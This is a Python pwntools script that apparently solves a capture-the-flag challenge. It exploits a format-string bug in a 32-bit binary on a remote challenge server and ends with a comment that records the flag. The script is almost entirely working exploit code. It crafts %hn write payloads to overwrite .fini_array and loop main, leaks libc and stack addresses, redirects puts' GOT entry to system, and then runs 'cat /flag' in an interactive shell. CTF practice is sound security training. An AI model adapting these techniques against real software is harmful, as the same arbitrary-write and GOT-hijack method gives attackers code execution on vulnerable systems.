from pwn import *

context.binary = exe = ELF('chal')
libc = ELF('libc.so.6')

def convert(int_num):
    if int_num < 0:
        int_num = int_num + 2**32
    return int_num

def craft_1(addr, value):
    target_low = value & 0xffff
    target_high = value >> 16
    payload = f'%{target_high-16}c%27$hn%{target_low-target_high}c%26$hn'.encode().ljust(28, b'-')
    payload += p32(addr) + p32(addr+2)
    return payload

def craft_2(addr_1, value_1, addr_2, value_2):
    target_low_1 = value_1 & 0xffff
    target_high_1 = ((value_1 & 0xffff0000) >> 16)
    target_low_2 = (value_2 & 0xffff)
    target_high_2 = ((value_2 & 0xffff0000) >> 16)

    if target_low_1 < target_low_2:
        write_1 = target_low_1
        idx_1 = 31
        write_2 = target_low_2
        idx_2 = 33
    else:
        write_1 = target_low_2
        idx_1 = 33
        write_2 = target_low_1
        idx_2 = 31

    payload = f'%{target_high_1}c%32$hn%{write_1-target_high_1}c%{idx_1}$hn'
    payload += f'%{write_2-write_1}c%{idx_2}$hn%{target_high_2-write_2}c%34$hn'
    payload = payload.encode().ljust(56, b'-')
    payload += p32(addr_1) + p32(addr_1+2) + p32(addr_2) + p32(addr_2+2)
    return payload

# io = process()
# gdb.attach(io, api=True)
io = remote('pwn.1337.sb', 13375)

fini_array = exe.get_section_by_name('.fini_array').header.sh_addr
payload = b'%c%*----' + craft_1(fini_array, exe.sym['main'])
payload += b'69' + b"%c"*7 + b"%*"
io.sendlineafter(b'message: ', payload)

io.recvuntil(b'is:\n')
io.recv(2)
libc.address = convert(int(io.recv(10))) - libc.sym['stdout']

io.recvuntil(b'69')
io.recv(8)
buffer = convert(int(io.recvline(keepends=False)))

log.info(f'buffer address: {hex(buffer)}')
log.info(f'libc base: {hex(libc.address)}')

payload = craft_2(buffer-88, exe.sym['main'], exe.got['puts'], libc.sym['system'])
io.sendafter(b'message: ', payload)

io.sendlineafter(b'message: ', b'cat /flag')
io.interactive()

# cr3{1_th0ught_main_w45_th3_3nd}